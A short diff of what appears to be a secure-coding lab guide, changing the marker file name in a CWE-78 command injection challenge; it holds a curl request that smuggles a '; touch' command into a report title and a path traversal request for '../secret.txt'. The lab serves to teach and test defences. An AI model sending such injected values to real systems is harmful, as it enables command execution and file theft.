@@ -25,8 +25,8 @@ curl -s "$V/invoices?name=../secret.txt"                           # vuln: reads
 ```
 **Ch4 — CWE-78 command injection** (POSIX)
 ```bash
-curl -s "$V/reports/export?title=report%3B%20touch%20/tmp/scc-pwned"   # vuln: runs touch
-ls /tmp/scc-pwned && rm /tmp/scc-pwned
+curl -s "$V/reports/export?title=report%3B%20touch%20/tmp/scc-pwned-vuln.txt"   # vuln: runs touch
+ls /tmp/scc-pwned-vuln.txt && rm /tmp/scc-pwned-vuln.txt
 ```
 **Ch5 — CWE-79 output encoding**
 ```bash
